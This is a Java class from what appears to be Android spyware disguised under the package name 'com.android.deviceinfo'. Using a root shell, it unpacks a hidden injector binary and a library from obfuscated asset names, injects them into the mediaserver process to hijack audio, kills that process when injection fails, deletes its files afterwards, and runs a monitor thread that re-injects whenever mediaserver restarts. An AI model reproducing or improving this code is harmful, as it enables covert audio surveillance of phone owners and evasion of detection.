package com.android.deviceinfo.util;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

import com.android.deviceinfo.Root;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;

import com.android.deviceinfo.file.Directory;

import com.android.deviceinfo.evidence.EvidenceBuilder;

import com.android.deviceinfo.file.AutoFile;

import com.android.m.M;

public class Instrument {
	private static final String TAG = "Instrument";
	private static final int MAX_KILLED = 3;
	private String proc;
	private MediaserverMonitor pidMonitor;
	private static String lib, hijacker, path, dumpPath, pidCompletePath, pidFile;
	private boolean stopMonitor = false;

	private Thread monitor;
	private int killed = 0;

	public Instrument(String process, String dump) {
		final File filesPath = Status.getAppContext().getFilesDir();

		proc = process;

		hijacker = "m";
		lib = "n";
		path = filesPath.getAbsolutePath();
		dumpPath = dump;
		pidFile = M.e("irg");
		pidCompletePath = path + "/" + pidFile;
	}

	private boolean deleteHijacker() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (installHijacker) delete lib");
		}
		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib);
		file.delete();
		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
		file.delete();
		return true;
	}

	private boolean installHijacker() {
		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so

		try {
			if (Root.isRootShellInstalled() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(installHijacker): Nope, we are not root");
				}

				return false;
			}

			// Install library
			Root.fileWrite(lib, stream, Cfg.RNDDB);
			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);

			// copy_remount libt.so to /system/lib/
			// Execute.execute(Configuration.shellFile + " " + "fhs" + " " +
			// "/system" + " " + path + "/" + lib + " " + "/system/lib/" + lib);

			stream.close();

			// Unpack the Hijacker
			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker

			Root.fileWrite(hijacker, stream, Cfg.RNDDB);

			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);

			stream.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}

		// File file = new File(Status.getAppContext().getFilesDir(), lib);
		// file.delete();

		return true;
	}

	public boolean startInstrumentation() {
		if (Root.isRootShellInstalled() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
			}

			return false;
		}

		try {
			int pid = getProcessPid();

			if (pid > 0) {
				// Run the injector
				String scriptName = "ij";
				String script = M.e("#!/system/bin/sh") + "\n";
				script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";

				Root.createScript(scriptName, script);
				ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (startInstrumentation) exit code: " + ret.exitCode);
				}

				Root.removeScript(scriptName);

				Utils.sleep(2000);
				int newpid = getProcessPid();
				if (newpid != pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
					}
				}

				File d = new File(dumpPath);

				boolean started = false;

				for (int i = 0; i < 5 && !started; i++) {
					File[] files = d.listFiles();
					for (File file : files) {
						if (file.getName().endsWith(M.e(".cnf"))) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
							}
							started = true;
							file.delete();
						}

					}
					if (!started) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (startInstrumentation) sleep 5 secs");
						}
						Utils.sleep(2000);
					}
				}

				if (!started && killed < MAX_KILLED) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Kill mediaserver");
					}
					killProc();
					killed += 1;

					if (started && Cfg.DEBUG) {
						Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
						EvidenceBuilder.info("Audio Hijack");
					}

					stopMonitor = false;

					if (pidMonitor == null) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (startInstrumentation) script: \n" + script);
							Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
						}

						pidMonitor = new MediaserverMonitor(pid);
						monitor = new Thread(pidMonitor);
						monitor.start();
					} else {
						pidMonitor.setPid(pid);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(getProcessPid): unable to get pid");
				}

			}
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (startInstrumentation) Error: " + e);
			}
			return false;
		} finally {
			deleteHijacker();
		}

		return true;
	}

	public void stopInstrumentation() {
		stopMonitor = true;
		monitor = null;
	}

	private int getProcessPid() {
		int pid;
		byte[] buf = new byte[4];

		Execute.execute(Configuration.shellFile + " " + M.e("lid") + " " + proc + " " + pidCompletePath);

		try {
			FileInputStream fis = Status.getAppContext().openFileInput(pidFile);

			fis.read(buf);
			fis.close();

			// Remove PID file
			File f = new File(pidCompletePath);
			f.delete();

			// Parse PID from the file
			ByteBuffer bbuf = ByteBuffer.wrap(buf);
			bbuf.order(ByteOrder.LITTLE_ENDIAN);
			pid = bbuf.getInt();
		} catch (IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return 0;
		}

		return pid;
	}

	public void killProc() {
		try {
			int pid = getProcessPid();
			Execute.executeRoot("kill " + pid);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (killProc) Error: " + ex);
			}
		}
	}

	class MediaserverMonitor implements Runnable {
		private int cur_pid, start_pid;

		public void setPid(int pid) {
			start_pid = pid;
		}

		public MediaserverMonitor(int pid) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(MediaserverMonitor): starting with pid " + pid);
			}

			setPid(pid);
		}

		@Override
		public void run() {
			while (true) {
				Utils.sleep(10000);

				if (stopMonitor) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
					}

					stopMonitor = false;
					return;
				}

				cur_pid = getProcessPid();

				// Mediaserver died
				if (cur_pid != start_pid) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
					}

					startInstrumentation();
					// start_pid = getProcessPid();
				}
			}
		}
	}
}
